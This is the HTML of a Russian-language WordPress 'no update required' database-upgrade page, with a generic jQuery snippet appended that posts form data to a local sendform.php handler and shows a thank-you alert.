<!DOCTYPE html>
<html lang="ru-RU">
<head>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta name="robots" content="noindex,nofollow" />
	<title>WordPress &rsaquo; Обновление</title>
	<link rel='stylesheet' id='dashicons-css'  href='/wp-includes/css/dashicons.min.css?ver=5.7' type='text/css' media='all' />
<link rel='stylesheet' id='buttons-css'  href='/wp-includes/css/buttons.min.css?ver=5.7' type='text/css' media='all' />
<link rel='stylesheet' id='forms-css'  href='/wp-admin/css/forms.min.css?ver=5.7' type='text/css' media='all' />
<link rel='stylesheet' id='l10n-css'  href='/wp-admin/css/l10n.min.css?ver=5.7' type='text/css' media='all' />
<link rel='stylesheet' id='install-css'  href='/wp-admin/css/install.min.css?ver=5.7' type='text/css' media='all' />
<script src="https://code.jquery.com/jquery-3.5.1.js" integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script></head>
<body class="wp-core-ui">
<p id="logo"><a href="https://ru.wordpress.org/">WordPress</a></p>


<h1>Обновление не требуется</h1>
<p>Ваша база данных WordPress уже обновлена!</p>
<p class="step"><a class="button button-large" href="/">Продолжить</a></p>

	<script>
                                            $(document).ready(function(){
                                                $("form").submit(function() { // Событие отправки с формы
                                                        var form_data = $(this).serialize(); // Собираем данные из полей
                                                        $.ajax({
                                                        type: "POST", // Метод отправки
                                                        url: "sendform.php", // Путь к PHP обработчику sendform.php
                                                        data: form_data,
                                                        success: function() {
                                                            alert('Спасибо за заявку');
                                                            }
                                                        });
                                                    event.preventDefault();
                                                });
                                            });
                                        </script>
</body>
</html>
